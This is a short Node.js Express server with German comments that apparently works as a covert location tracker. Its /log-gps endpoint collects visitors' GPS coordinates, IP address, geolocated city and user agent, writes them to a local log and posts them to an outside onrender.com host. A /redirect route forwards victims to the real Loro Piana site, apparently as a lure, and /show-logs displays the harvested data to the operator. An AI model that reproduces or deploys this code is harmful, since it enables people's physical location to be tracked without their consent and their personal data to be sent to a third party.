const express = require('express');
const path = require('path');
const fs = require('fs');
const geoip = require('geoip-lite');
const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.set('trust proxy', true);
app.use(express.static('public'));

// GPS-Daten speichern und anzeigen
app.get('/log-gps', async (req, res) => { // WICHTIG: async hinzufügen
    const { lat, lon, accuracy } = req.query;
    const ip = req.ip.split(',')[0];
    const geo = geoip.lookup(ip);
    const userAgent = req.headers['user-agent'];

    // Log-Eintrag
    const logData = {
        timestamp: new Date().toISOString(),
        ip: ip,
        location: geo ? `${geo.city}, ${geo.country}` : "Unknown",
        coordinates: lat && lon ? `${lat}, ${lon} (±${accuracy}m)` : "Blocked",
        device: userAgent
    };

    // 1. Lokal speichern
    fs.appendFileSync('gps.log', JSON.stringify(logData) + '\n');

    // 2. An externen Server senden (falls gewünscht)
    try {
        await fetch('https://loropiana1-1.onrender.com/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(logData)
        });
    } catch (error) {
        console.error("Fehler beim Senden an externen Server:", error);
    }

    res.sendStatus(204);
});
// Weiterleitung
app.get('/redirect', (req, res) => {
    res.redirect('https://de.loropiana.com');
});

// Live-Log-Anzeige (NUR FÜR DICH!)
app.get('/show-logs', (req, res) => {
    try {
        const logs = fs.readFileSync('gps.log', 'utf8');
        res.send(`<pre>${logs.replace(/\n/g, '<br>')}</pre>`);
    } catch {
        res.send("Noch keine Logs vorhanden.");
    }
});

app.listen(PORT, () => console.log(`✅ Tracking aktiv auf Port ${PORT}`));
